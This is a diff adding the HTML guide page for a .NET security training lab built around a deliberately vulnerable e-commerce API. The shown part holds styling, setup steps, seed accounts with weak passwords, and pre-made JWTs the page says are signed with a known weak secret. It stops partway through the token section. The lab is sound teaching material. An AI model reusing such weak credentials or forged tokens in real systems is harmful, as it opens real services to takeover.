@@ -1,0 +1,1424 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Code-Blooded — .NET Security Forensic Lab</title>
+<style>
+:root{
+  --bg:#0d1117; --bg-elev:#161b22; --bg-elev2:#1c2330; --border:#2a3441;
+  --text:#e6edf3; --text-dim:#9aa7b4; --text-faint:#6b7787;
+  --accent:#4dd0a7; --accent-dim:#1f6d57;
+  --danger:#ff6b6b; --danger-dim:#5c2626;
+  --warn:#f5c451; --warn-dim:#5c4a1f;
+  --info:#5ab0ff; --info-dim:#1f4a6d;
+  --code-bg:#0a0e14;
+  --mono:"SF Mono",ui-monospace,"Cascadia Code","JetBrains Mono",Menlo,Consolas,monospace;
+  --sans:system-ui,-apple-system,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+}
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{margin:0;background:var(--bg);color:var(--text);font-family:var(--sans);line-height:1.6;font-size:15px}
+a{color:var(--info);text-decoration:none}
+a:hover{text-decoration:underline}
+h1,h2,h3,h4{line-height:1.25;margin:0}
+code{font-family:var(--mono);font-size:.86em}
+.wrap{display:grid;grid-template-columns:270px 1fr;min-height:100vh}
+
+/* ---------- Sidebar ---------- */
+.side{position:sticky;top:0;align-self:start;height:100vh;overflow-y:auto;background:var(--bg-elev);border-right:1px solid var(--border);padding:20px 0}
+.side .brand{padding:0 20px 16px;border-bottom:1px solid var(--border);margin-bottom:12px}
+.side .brand .logo{font-weight:800;font-size:18px;letter-spacing:.5px;display:flex;align-items:center;gap:8px}
+.side .brand .logo .dot{width:9px;height:9px;border-radius:50%;background:var(--danger);box-shadow:0 0 10px var(--danger)}
+.side .brand .sub{color:var(--text-faint);font-size:12px;margin-top:4px}
+.nav a{display:block;padding:7px 20px;color:var(--text-dim);font-size:13.5px;border-left:3px solid transparent}
+.nav a:hover{background:var(--bg-elev2);text-decoration:none;color:var(--text)}
+.nav a.active{color:var(--text);border-left-color:var(--accent);background:var(--bg-elev2)}
+.nav a .tag{font-family:var(--mono);font-size:11px;color:var(--text-faint);margin-right:7px}
+.nav .group{padding:14px 20px 5px;font-size:11px;text-transform:uppercase;letter-spacing:1px;color:var(--text-faint);font-weight:700}
+.nav a.done .tick{color:var(--accent)}
+.nav a .tick{color:transparent;margin-left:6px;font-size:12px}
+.side .reset{margin:16px 20px 0;display:flex;flex-direction:column;gap:8px}
+.side .reset button{width:100%;background:transparent;border:1px solid var(--border);color:var(--text-faint);padding:7px;border-radius:6px;cursor:pointer;font-size:12px}
+.side .reset button:hover{border-color:var(--danger);color:var(--danger)}
+.side .reset button.app{color:var(--text-dim);border-color:var(--danger-dim)}
+.side .reset button.app:hover{background:var(--danger-dim);color:var(--danger);border-color:var(--danger)}
+.side .reset button:disabled{opacity:.6;cursor:progress}
+
+/* ---------- Main ---------- */
+main{max-width:900px;margin:0 auto;padding:0 32px 120px;width:100%}
+
+/* progress + timer header */
+.topbar{position:sticky;top:0;z-index:20;background:rgba(13,17,23,.86);backdrop-filter:blur(8px);border-bottom:1px solid var(--border);padding:12px 0;margin-bottom:8px}
+.topbar .row{display:flex;align-items:center;gap:16px;flex-wrap:wrap}
+.pbar{flex:1;min-width:180px;height:8px;background:var(--bg-elev2);border-radius:99px;overflow:hidden}
+.pbar > i{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--accent-dim),var(--accent));transition:width .4s ease}
+.pcount{font-family:var(--mono);font-size:12.5px;color:var(--text-dim);white-space:nowrap}
+.timer{display:flex;align-items:center;gap:10px;font-family:var(--mono);font-size:13px}
+.timer .clock{background:var(--code-bg);border:1px solid var(--border);border-radius:6px;padding:5px 10px;color:var(--accent);min-width:64px;text-align:center;font-variant-numeric:tabular-nums}
+.timer button{background:var(--accent-dim);border:1px solid var(--accent);color:var(--text);border-radius:6px;padding:5px 12px;cursor:pointer;font-size:12px}
+.timer button:hover{background:var(--accent);color:#04140e}
+.timer .phase{color:var(--text-faint);font-size:12px}
+
+/* hero */
+.hero{padding:44px 0 24px;border-bottom:1px solid var(--border);margin-bottom:36px}
+.hero h1{font-size:34px;font-weight:800;letter-spacing:-.5px}
+.hero .lead{color:var(--text-dim);font-size:17px;margin-top:12px;max-width:640px}
+.hero .meta{display:flex;gap:10px;flex-wrap:wrap;margin-top:20px}
+.chip{font-size:12.5px;font-family:var(--mono);background:var(--bg-elev2);border:1px solid var(--border);border-radius:99px;padding:5px 12px;color:var(--text-dim)}
+.chip b{color:var(--text)}
+
+/* sections */
+section{padding:40px 0;border-top:1px solid var(--border);scroll-margin-top:80px}
+section:first-of-type{border-top:0}
+.sec-head{display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;margin-bottom:6px}
+.sec-head h2{font-size:24px;font-weight:700}
+.owasp{font-family:var(--mono);font-size:12px;font-weight:700;color:var(--danger);background:var(--danger-dim);border:1px solid var(--danger);border-radius:5px;padding:2px 8px}
+.sec-sub{color:var(--text-dim);margin:4px 0 22px;font-size:15px}
+.time-hint{font-family:var(--mono);font-size:12px;color:var(--text-faint);margin-left:auto}
+.mode{font-family:var(--mono);font-size:11px;font-weight:700;border:1px solid;border-radius:5px;padding:2px 8px;text-transform:uppercase;letter-spacing:.5px}
+.mode.demo{color:var(--accent);border-color:var(--accent-dim)}
+.mode.opt{color:var(--text-faint);border-color:var(--border)}
+.mode.grp{color:var(--info);border-color:var(--info-dim)}
+.mode.grp:empty{display:none}
+/* group picker */
+.picker{display:flex;flex-wrap:wrap;gap:8px;align-items:center;margin:10px 0}
+.picker .lbl{font-family:var(--mono);font-size:11px;color:var(--text-faint);text-transform:uppercase;letter-spacing:.5px;min-width:92px}
+.picker button{background:var(--bg-elev2);border:1px solid var(--border);color:var(--text-dim);border-radius:6px;padding:5px 12px;cursor:pointer;font-family:var(--mono);font-size:12.5px}
+.picker button:hover{color:var(--text);border-color:var(--accent-dim)}
+.picker button.on{background:var(--accent-dim);border-color:var(--accent);color:var(--text)}
+.mine-box{border:1px solid var(--accent-dim);border-radius:10px;padding:14px 16px;margin:14px 0;background:linear-gradient(135deg,rgba(31,109,87,.14),var(--bg-elev))}
+.mine-box .none{color:var(--text-faint)}
+section.brief.mine .sec-head h2::after{content:" · your group";color:var(--accent);font-size:14px;font-weight:600}
+section.brief.theirs{opacity:.72}
+.nav a.mine{color:var(--accent)}
+tr.mine td{background:rgba(31,109,87,.14)}
+
+h3.q{font-size:17px;margin:26px 0 10px;color:var(--text)}
+p{margin:12px 0}
+ul,ol{margin:12px 0;padding-left:22px}
+li{margin:5px 0}
+.muted{color:var(--text-dim)}
+
+/* cards / callouts */
+.card{background:var(--bg-elev);border:1px solid var(--border);border-radius:10px;padding:18px 20px;margin:18px 0}
+.callout{border-left:4px solid var(--border);border-radius:8px;padding:12px 16px;margin:16px 0;background:var(--bg-elev)}
+.callout .h{font-weight:700;font-size:13px;text-transform:uppercase;letter-spacing:.5px;margin-bottom:4px;display:flex;align-items:center;gap:7px}
+.callout.why{border-left-color:var(--info);background:linear-gradient(90deg,var(--info-dim)22,transparent)}
+.callout.why .h{color:var(--info)}
+.callout.warn{border-left-color:var(--warn)}
+.callout.warn .h{color:var(--warn)}
+.callout.danger{border-left-color:var(--danger)}
+.callout.danger .h{color:var(--danger)}
+.callout.fix{border-left-color:var(--accent)}
+.callout.fix .h{color:var(--accent)}
+
+/* code blocks */
+.code{position:relative;background:var(--code-bg);border:1px solid var(--border);border-radius:8px;margin:14px 0}
+.code pre{margin:0;padding:14px 16px;overflow-x:auto;font-family:var(--mono);font-size:12.8px;line-height:1.55;color:#cdd9e5}
+.code .label{position:absolute;top:0;left:14px;transform:translateY(-50%);background:var(--bg-elev2);border:1px solid var(--border);border-radius:4px;font-family:var(--mono);font-size:10.5px;color:var(--text-faint);padding:1px 7px;text-transform:uppercase;letter-spacing:.5px}
+.code .copy{position:absolute;top:8px;right:8px;background:var(--bg-elev2);border:1px solid var(--border);color:var(--text-dim);border-radius:5px;font-size:11px;padding:3px 9px;cursor:pointer;font-family:var(--sans)}
+.code .copy:hover{color:var(--text);border-color:var(--accent)}
+.code .copy.ok{color:var(--accent);border-color:var(--accent)}
+.tok-m{color:var(--warn)} .tok-u{color:var(--info)} .tok-c{color:var(--text-faint)} .tok-s{color:var(--accent)} .tok-b{color:var(--danger)}
+
+/* run buttons + inline responses */
+.code .run{position:absolute;top:8px;right:62px;background:var(--accent-dim);border:1px solid var(--accent);color:var(--text);border-radius:5px;font-size:11px;padding:3px 10px;cursor:pointer;font-family:var(--sans)}
+.code .run:hover{background:var(--accent);color:#04140e}
+.code .run.busy{opacity:.55;cursor:progress}
+.code .run.arm{background:var(--danger-dim);border-color:var(--danger);color:var(--text)}
+.code .run[disabled]{background:transparent;border-color:var(--border);color:var(--text-faint);cursor:not-allowed}
+.resp{border-top:1px dashed var(--border);padding:11px 16px 13px;font-family:var(--mono);font-size:12.2px;background:rgba(0,0,0,.18)}
+.resp .st{display:flex;align-items:center;gap:10px;flex-wrap:wrap;margin-bottom:7px}
+.resp .st .sc{font-weight:700}
+.resp .st .sc.ok{color:var(--accent)} .resp .st .sc.bad{color:var(--danger)} .resp .st .sc.err{color:var(--warn)}
+.resp .st .meta{color:var(--text-faint);font-size:11.5px}
+.resp pre{margin:0;padding:0;background:none;max-height:260px;overflow:auto;color:#cdd9e5;font-size:12.2px;line-height:1.5;white-space:pre-wrap;word-break:break-word}
+.resp .note{color:var(--text-dim);font-size:12px;font-family:var(--sans);margin-top:7px;line-height:1.5}
+
+/* session / token bar */
+.session{background:var(--bg-elev);border:1px solid var(--border);border-radius:10px;margin:16px 0;overflow:hidden}
+.session .row{display:flex;gap:9px;align-items:center;flex-wrap:wrap;padding:13px 15px}
+.session .row+.row{padding-top:0}
+.session label{font-size:11px;font-family:var(--mono);color:var(--text-faint);text-transform:uppercase;letter-spacing:.5px}
+.session input{background:var(--code-bg);border:1px solid var(--border);border-radius:6px;color:var(--text);padding:6px 9px;font-family:var(--mono);font-size:12px;min-width:210px}
+.session input:focus{outline:none;border-color:var(--accent-dim)}
+.session button{background:var(--bg-elev2);border:1px solid var(--border);color:var(--text-dim);border-radius:6px;padding:6px 11px;cursor:pointer;font-size:12px}
+.session button:hover{color:var(--text);border-color:var(--accent)}
+.session button.ghost:hover{border-color:var(--danger);color:var(--danger)}
+.tokchip{font-family:var(--mono);font-size:11.5px;border:1px solid var(--border);border-radius:99px;padding:3px 11px;color:var(--text-faint)}
+.tokchip.have{color:var(--accent);border-color:var(--accent-dim)}
+/* topbar identity switch — one session at a time, like a real browser */
+.authbar{display:flex;align-items:center;gap:7px;font-family:var(--mono);font-size:12px}
+.authbar .lbl{color:var(--text-faint);font-size:11px;text-transform:uppercase;letter-spacing:.5px}
+.authbar .seg{display:flex}
+.authbar label{background:var(--code-bg);border:1px solid var(--border);color:var(--text-dim);padding:4px 11px;cursor:pointer;font-size:12px;display:flex;align-items:center;gap:5px}
+.authbar label:first-child{border-radius:6px 0 0 6px}
+.authbar label:last-child{border-radius:0 6px 6px 0}
+.authbar label+label{border-left:0}
+.authbar label:hover{color:var(--text)}
+.authbar label input{position:absolute;opacity:0;width:0;height:0;pointer-events:none}
+.authbar label::before{content:"";width:7px;height:7px;border-radius:50%;border:1px solid var(--text-faint)}
+.authbar label.on{background:var(--accent-dim);border-color:var(--accent);color:var(--text)}
+.authbar label.on::before{background:var(--accent);border-color:var(--accent)}
+.authbar label.on+label{border-left:0}
+.authbar label.busy{opacity:.6;cursor:progress}
+.authbar label.fail{border-color:var(--danger);color:var(--danger)}
+.authbar #logoutBtn{background:transparent;border:1px solid var(--border);color:var(--text-faint);border-radius:6px;padding:4px 9px;cursor:pointer;font-family:var(--mono);font-size:11.5px}
+.authbar #logoutBtn:hover:not([disabled]){border-color:var(--danger);color:var(--danger)}
+.authbar #logoutBtn[disabled]{opacity:.4;cursor:default}
+
+.run-inline{background:var(--accent-dim);border:1px solid var(--accent);color:var(--text);border-radius:5px;font-size:11px;padding:2px 9px;cursor:pointer;font-family:var(--sans);margin-left:8px;white-space:nowrap}
+.run-inline:hover{background:var(--accent);color:#04140e}
+.run-inline.danger{background:var(--danger-dim);border-color:var(--danger)}
+.run-inline.danger:hover{background:var(--danger);color:#1a0505}
+.run-inline.busy{opacity:.55;cursor:progress}
+.out-panel{border:1px solid var(--border);border-radius:8px;background:var(--code-bg);margin:14px 0}
+.out-panel .resp{border-top:0}
+
+/* tables */
+table{width:100%;border-collapse:collapse;margin:16px 0;font-size:13.5px}
+th,td{text-align:left;padding:9px 12px;border-bottom:1px solid var(--border);vertical-align:top}
+th{color:var(--text-faint);font-size:11.5px;text-transform:uppercase;letter-spacing:.5px;font-weight:700}
+td code{color:var(--accent)}
+tbody tr:hover{background:var(--bg-elev)}
+.b-ok{color:var(--accent)} .b-bad{color:var(--danger)}
+
+/* checklist / tasks */
+.task{display:flex;gap:12px;align-items:flex-start;background:var(--bg-elev);border:1px solid var(--border);border-radius:9px;padding:13px 15px;margin:10px 0;cursor:pointer;transition:border-color .15s}
+.task:hover{border-color:var(--accent-dim)}
+.task input{appearance:none;width:20px;height:20px;border:2px solid var(--text-faint);border-radius:5px;margin-top:1px;flex:none;cursor:pointer;position:relative;transition:.15s}
+.task input:checked{background:var(--accent);border-color:var(--accent)}
+.task input:checked::after{content:"✓";position:absolute;color:#04140e;font-size:14px;font-weight:800;left:3px;top:-2px}
+.task .body{flex:1}
+.task.checked .title{color:var(--text-faint);text-decoration:line-through}
+.task .title{font-weight:600}
+.task .desc{color:var(--text-dim);font-size:13px;margin-top:2px}
+.task.fix{border-left:3px solid var(--accent-dim);background:linear-gradient(90deg,rgba(31,109,87,.10),var(--bg-elev))}
+.task.fix .title::before{content:"🔧 ";}
+.task.fix input:checked{background:var(--accent);border-color:var(--accent)}
+.task.audit{border-left:3px solid var(--info-dim);background:linear-gradient(90deg,rgba(31,74,109,.12),var(--bg-elev))}
+.task.audit .title::before{content:"🔍 ";}
+.task.audit input:checked{background:var(--info);border-color:var(--info)}
+
+/* reveal / spoiler */
+details.reveal{margin:14px 0;border:1px solid var(--border);border-radius:8px;background:var(--bg-elev);overflow:hidden}
+details.reveal>summary{cursor:pointer;padding:11px 16px;font-weight:600;font-size:13.5px;color:var(--accent);list-style:none;display:flex;align-items:center;gap:8px}
+details.reveal>summary::-webkit-details-marker{display:none}
+details.reveal>summary::before{content:"▶";font-size:10px;color:var(--text-faint);transition:transform .2s}
+details.reveal[open]>summary::before{transform:rotate(90deg)}
+details.reveal .inner{padding:2px 18px 16px;border-top:1px solid var(--border)}
+
+/* checkpoint */
+.checkpoint{border:1px solid var(--accent-dim);background:linear-gradient(135deg,rgba(31,109,87,.18),var(--bg-elev));border-radius:12px;padding:26px;margin:44px 0}
+.checkpoint .flag{display:inline-flex;align-items:center;gap:8px;font-family:var(--mono);font-size:12px;font-weight:700;color:var(--accent);text-transform:uppercase;letter-spacing:1px}
+.checkpoint h2{font-size:22px;margin:10px 0 6px}
+.checkpoint .catchup{margin-top:18px;border-top:1px dashed var(--accent-dim);padding-top:16px}
+
+/* part divider */
+.part-divider{text-align:center;padding:60px 0 10px}
+.part-divider .k{font-family:var(--mono);color:var(--danger);font-size:13px;letter-spacing:3px;text-transform:uppercase}
+.part-divider h2{font-size:30px;margin-top:8px;font-weight:800}
+.part-divider p{color:var(--text-dim);max-width:600px;margin:10px auto 0}
+
+kbd{font-family:var(--mono);font-size:11.5px;background:var(--bg-elev2);border:1px solid var(--border);border-bottom-width:2px;border-radius:4px;padding:1px 6px}
+.pill{font-family:var(--mono);font-size:11px;padding:2px 7px;border-radius:4px;border:1px solid}
+.pill.get{color:var(--accent);border-color:var(--accent-dim)}
+.pill.post{color:var(--warn);border-color:var(--warn-dim)}
+.pill.opt{color:var(--info);border-color:var(--info-dim)}
+
+.footer{padding:40px 0 0;color:var(--text-faint);font-size:12.5px;border-top:1px solid var(--border);margin-top:40px}
+
+@media (max-width:860px){
+  .wrap{grid-template-columns:1fr}
+  .side{position:static;height:auto;border-right:0;border-bottom:1px solid var(--border)}
+  .side .nav{display:none}
+  main{padding:0 18px 80px}
+}
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<!-- ===================== SIDEBAR ===================== -->
+<aside class="side">
+  <div class="brand">
+    <div class="logo"><span class="dot"></span> CODE-BLOODED</div>
+    <div class="sub">.NET Security Forensic Lab · 3h</div>
+  </div>
+  <nav class="nav" id="nav">
+    <div class="group">Setup</div>
+    <a href="#setup" data-sec="setup"><span class="tag">00</span>Prerequisites &amp; start<span class="tick">●</span></a>
+    <div class="group">Part 1 · Forensics (0:00–1:30)</div>
+    <a href="#tokens" data-sec="tokens"><span class="tag">0</span>Get your tokens<span class="tick">●</span></a>
+    <a href="#groups" data-sec="groups"><span class="tag">GRP</span>Your group<span class="tick">●</span></a>
+    <a href="#scan" data-sec="scan"><span class="tag">1</span>Scan together<span class="tick">●</span></a>
+    <a href="#groupwork" data-sec="groupwork"><span class="tag">2</span>Fix &rarr; Prove &rarr; Audit<span class="tick">●</span></a>
+    <div class="group">Category briefs</div>
+    <a href="#a01" data-sec="a01"><span class="tag">A01</span>Broken Access Control<span class="tick">●</span></a>
+    <a href="#a02" data-sec="a02"><span class="tag">A02</span>Cryptographic Failures<span class="tick">●</span></a>
+    <a href="#a03" data-sec="a03"><span class="tag">A03</span>SQL Injection<span class="tick">●</span></a>
+    <a href="#a05" data-sec="a05"><span class="tag">A05</span>Misconfiguration<span class="tick">●</span></a>
+    <a href="#a07" data-sec="a07"><span class="tag">A07</span>Auth Failures<span class="tick">●</span></a>
+    <a href="#a09" data-sec="a09"><span class="tag">A09</span>Sensitive Logging<span class="tick">●</span></a>
+    <div class="group">Part 1 · wrap-up</div>
+    <a href="#present" data-sec="present"><span class="tag">3</span>Present<span class="tick">●</span></a>
+    <a href="#checkpoint1" data-sec="checkpoint1"><span class="tag">◆</span>Checkpoint 1<span class="tick">●</span></a>
+    <div class="group">Part 2 · Supply Chain (1:30–3:00)</div>
+    <a href="#a08" data-sec="a08"><span class="tag">A08</span>The DI attack point<span class="tick">●</span></a>
+    <a href="#di-concept" data-sec="di-concept"><span class="tag">2.1</span>How the override works<span class="tick">●</span></a>
+    <a href="#group-task" data-sec="group-task"><span class="tag">2.2</span>Group exercise<span class="tick">●</span></a>
+    <a href="#defenses" data-sec="defenses"><span class="tag">2.3</span>Detection &amp; defense<span class="tick">●</span></a>
+    <a href="#wrap" data-sec="wrap"><span class="tag">◆</span>Wrap-up<span class="tick">●</span></a>
+    <div class="group">Reference</div>
+    <a href="#reference" data-sec="reference"><span class="tag">★</span>Cheat sheet<span class="tick">●</span></a>
+  </nav>
+  <div class="reset">
+    <button type="button" class="app" id="resetAppBtn" title="Restart the API, restore the seed data, and clear responses from earlier Run buttons">Reset application</button>
+    <button type="button" id="resetBtn">Reset all progress</button>
+  </div>
+</aside>
+
+<!-- ===================== MAIN ===================== -->
+<main>
+  <!-- top bar: progress + timer -->
+  <div class="topbar">
+    <div class="row">
+      <div class="pbar"><i id="pbarFill"></i></div>
+      <div class="pcount" id="pcount">0 / 0 done</div>
+      <div class="authbar" id="authbar" role="radiogroup" aria-label="Logged in as">
+        <span class="lbl">logged in as</span>
+        <span class="seg">
+          <label><input type="radio" name="who" value="alice"><span>alice</span></label>
+          <label><input type="radio" name="who" value="bob"><span>bob</span></label>
+          <label><input type="radio" name="who" value="admin"><span>admin</span></label>
+        </span>
+        <button id="logoutBtn" title="Drop the session">log out</button>
+      </div>
+      <div class="timer">
+        <span class="clock" id="clock">00:00</span>
+        <button id="timerBtn">Start</button>
+        <span class="phase" id="phase">3-hour session</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- hero -->
+  <div class="hero">
+    <h1>Code-Blooded</h1>
+    <p class="lead"><b style="color:var(--text)">.NET Security Forensic Lab.</b> A hands-on investigation of complex security flaws in modern .NET&nbsp;10 — beyond simple input validation. In Part&nbsp;1 you play forensic analyst on a deliberately vulnerable, partly AI-generated (&ldquo;vibecoded&rdquo;) e-commerce API, hunting the OWASP Top&nbsp;10 with static analysis and asking whether AI-suggested fixes actually help or add new risk. In Part&nbsp;2 you weaponize a dependency-injection supply-chain attack — then design the defenses.</p>
+    <div class="meta">
+      <span class="chip">⏱ <b>3 hours</b></span>
+      <span class="chip">🎯 <b>7</b> OWASP categories</span>
+      <span class="chip">🔬 Semgrep SAST</span>
+      <span class="chip">📦 Supply‑chain attack</span>
+      <span class="chip">✅ Progress saved locally</span>
+    </div>
+    <div class="card" style="margin-top:22px">
+      <div style="font-weight:700;margin-bottom:10px">Part 1 runs in groups — you don't hand-patch anything. Your group's coding agent fixes your categories; your group puts its work on trial, then presents it.</div>
+      <div style="display:flex;gap:16px;flex-wrap:wrap">
+        <div style="flex:1;min-width:130px"><b style="color:var(--info)">1 · See</b><div class="muted" style="font-size:12.5px;margin-top:3px">The presenter demos two flaws live.</div></div>
+        <div style="flex:1;min-width:130px"><b style="color:var(--warn)">2 · Scan</b><div class="muted" style="font-size:12.5px;margin-top:3px">Everyone scans once. Groups get their categories.</div></div>
+        <div style="flex:1;min-width:130px"><b style="color:var(--accent)">3 · Fix</b><div class="muted" style="font-size:12.5px;margin-top:3px">Your agent fixes <i>your</i> findings.</div></div>
+        <div style="flex:1;min-width:130px"><b style="color:var(--danger)">4 · Prove &amp; audit</b><div class="muted" style="font-size:12.5px;margin-top:3px">Re-run the attack. Read the diff. Did it really fix it?</div></div>
+        <div style="flex:1;min-width:130px"><b style="color:var(--text)">5 · Present</b><div class="muted" style="font-size:12.5px;margin-top:3px">4 minutes: the problem, the fix, the proof, what it missed.</div></div>
+      </div>
+    </div>
+    <p class="muted" style="font-size:13.5px;margin-top:18px">The app <b>Aviato</b> is partly AI-generated and deliberately broken, running on your own machine. The lesson isn't &ldquo;the agent is bad&rdquo; — it will fix most of this correctly. The lesson is that <i>most</i> isn't <i>all</i>, and you can only tell the difference by reading the diff.</p>
+  </div>
+
+  <!-- ============ SETUP ============ -->
+  <section id="setup">
+    <div class="sec-head"><h2>00 · Prerequisites &amp; starting the app</h2><span class="time-hint">~10 min</span></div>
+    <p class="sec-sub">Get the lab running before the clock starts. Tick each item as you go — either path below covers the same list.</p>
+
+    <h3 class="q">Dev container in VS Code</h3>
+    <div class="callout why"><div class="h">A container runtime is required</div>Docker, Podman, or another engine the <b>Dev Containers</b> extension can use — and it has to be running before you reopen. The container already has the .NET&nbsp;10 SDK, a pinned Semgrep, and the C# Dev Kit and REST Client extensions. When it finishes starting, the API is up and port 5218 is forwarded to your machine, so the install steps below are already done.</div>
+    <ol>
+      <li>In VS Code, install the <b>Dev Containers</b> extension if it isn't there.</li>
+      <li>Open this repo. Command Palette → <b>Dev Containers: Reopen in Container</b>. The first build takes a few minutes.</li>
+      <li>When the window comes back, run <code>dotnet --version</code> and <code>semgrep --version</code> in the container's terminal, then open <code>http://localhost:5218</code>. Tick the items below and continue.</li>
+    </ol>
+    <p class="muted">The API log — the one you watch for A09 — is the terminal the container opened when it started. <b>Reset application</b> in the sidebar restarts that process and re-seeds the database.</p>
+
+    <h3 class="q">Or install it yourself</h3>
+    <div class="task" data-id="setup-1"><input type="checkbox"><div class="body"><div class="title">.NET 10 SDK installed</div><div class="desc">Check with <code>dotnet --version</code> (should print a 10.x version). Inside the dev container this is already true.</div></div></div>
+    <div class="task" data-id="setup-2"><input type="checkbox"><div class="body"><div class="title">VS Code with <b>C# Dev Kit</b> + <b>REST Client</b> extensions</div><div class="desc">The REST Client extension runs the <code>.http</code> request files you'll use all workshop. The dev container installs both for you.</div></div></div>
+    <div class="task" data-id="setup-3"><input type="checkbox"><div class="body"><div class="title">Semgrep CLI installed</div><div class="desc"><code>pipx install semgrep</code> (or <code>pip install semgrep</code>) — the scanner that produces the agent's to-do list. Then check <code>semgrep --version</code> prints a version: <code>pip</code> often installs into a scripts folder that isn't on your <code>PATH</code>. Skip this inside the dev container; Semgrep is already on the path there.</div></div></div>
+    <div class="task" data-id="setup-5"><input type="checkbox"><div class="body"><div class="title">A coding agent you can drive</div><div class="desc">Whatever you use — Claude Code, GitHub Copilot, Cursor. It does the fixing in Part 1; you audit its work.</div></div></div>
+    <div class="task" data-id="setup-4"><input type="checkbox"><div class="body"><div class="title">API is running</div><div class="desc">In the dev container it is already running — confirm <code>http://localhost:5218</code>. On your own machine, run the command below and confirm it listens on port 5218.</div></div></div>
+
+    <div class="code"><span class="label">bash · local install</span><button class="copy">Copy</button><pre>dotnet run --project Aviato.API</pre></div>
+    <p class="muted">The API comes up at <code>http://localhost:5218</code> with an in‑memory SQLite database that is <b>re‑seeded on every start</b>. <b>Reset application</b> in the sidebar restarts the process and clears the responses from the Run buttons on this page.</p>
+
+    <div class="callout why"><div class="h">▶ Run the requests from this page</div>Every <code>http</code> block below has a <b>Run</b> button — it fires the request at the API and shows the response inline, so you can work through the lab without leaving the guide. The <code>.http</code> files stay authoritative (and the REST Client is still worth having). Two things to know: you are logged in as exactly one user at a time (the switch in the top bar), and the buttons only work while the CORS wildcard is in place — <i>fixing A05 switches them off</i>, which is the point. If a request fails while the API is clearly running, serve this page over http (<code>python3 -m http.server</code>, then open <code>http://localhost:8000/workshop.html</code>) instead of opening the file from disk.</div>
+
+    <h3 class="q">Seed accounts</h3>
+    <table>
+      <thead><tr><th>Username</th><th>Password</th><th>Role</th></tr></thead>
+      <tbody>
+        <tr><td><code>admin</code></td><td><code>admin123</code></td><td>admin</td></tr>
+        <tr><td><code>alice</code></td><td><code>password</code></td><td>customer</td></tr>
+        <tr><td><code>bob</code></td><td><code>password</code></td><td>customer</td></tr>
+      </tbody>
+    </table>
+
+    <div class="callout warn"><div class="h">⚠ Keep the API log visible</div>You'll <i>watch that log</i> for the A09 exercise. In the dev container it's the terminal opened at start; on your own machine it's the one running <code>dotnet run</code>. In Part&nbsp;1 the API runs its <b>legitimate</b> payment service, so nothing else is needed yet. In Part&nbsp;2 you'll restart it with the malicious override enabled and open a second terminal for the attacker's listener.</div>
+  </section>
+
+  <!-- ============ TOKENS ============ -->
+  <section id="tokens">
+    <div class="sec-head"><h2>Step 0 · Get your tokens</h2><span class="time-hint">~5 min</span></div>
+    <p class="sec-sub">Most requests need a JWT. Log in as each user once and keep the tokens handy — the REST Client stores them as file variables (<code>@aliceToken</code>, <code>@bobToken</code>, <code>@adminToken</code>).</p>
+    <p>Open <code>Aviato.API/http/00_setup.http</code> and run all three logins. Copy each <code>token</code> from the response into the matching variable.</p>
+
+    <p class="muted">Or log in straight from this page. The identity switch in the top bar works like a real browser session: <b>you are one user at a time</b>. Picking a user logs in, keeps that token in this browser, and fills it into the matching <code>{{…}}</code> placeholder when you press <b>Run</b>. A request that needs a different user tells you to switch — which is half the point of the IDOR exercise.</p>
+    <div class="session" id="session">
+      <div class="row">
+        <label for="baseUrl">API</label>
+        <input id="baseUrl" spellcheck="false" value="http://localhost:5218">
+        <span class="tokchip" id="whoChip">not logged in</span>
+        <button class="ghost" id="clearTokens">Log out</button>
+      </div>
+      <div class="resp" id="sessionOut" hidden></div>
+    </div>
+
+    <div class="code"><span class="label">http · login</span><button class="copy">Copy</button><pre><span class="tok-m">POST</span> <span class="tok-u">http://localhost:5218/auth/login</span>
+Content-Type: application/json
+
+{ <span class="tok-s">"username"</span>: <span class="tok-s">"alice"</span>, <span class="tok-s">"password"</span>: <span class="tok-s">"password"</span> }</pre></div>
+    <details class="reveal"><summary>Skip the copy-paste: pre-made tokens</summary><div class="inner">
+      <p class="muted" style="font-size:13px">These are self-signed with the known pre-fix secret. Paste one straight after <code>Bearer </code>. They are valid <b>only before the A02/A07 fixes</b> — once the secret is rotated and issuer/audience/lifetime validation is on, they are supposed to return <b>401</b>. That failure <i>is</i> the verification.</p>
+      <div class="code"><span class="label">alice · customer</span><button class="copy">Copy</button><pre>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6IjIiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1lIjoiYWxpY2UiLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOiJjdXN0b21lciJ9.3EVPSNFbzRpDHkcai3Piu2JGPZ1nod-Reae6Ohj7648</pre></div>
+      <div class="code"><span class="label">bob · customer</span><button class="copy">Copy</button><pre>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6IjMiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1lIjoiYm9iIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjoiY3VzdG9tZXIifQ.I7c7CtXZlKZ234FUMz2q1qQ2RVh1dn0i2wnd1Hp9sME</pre></div>
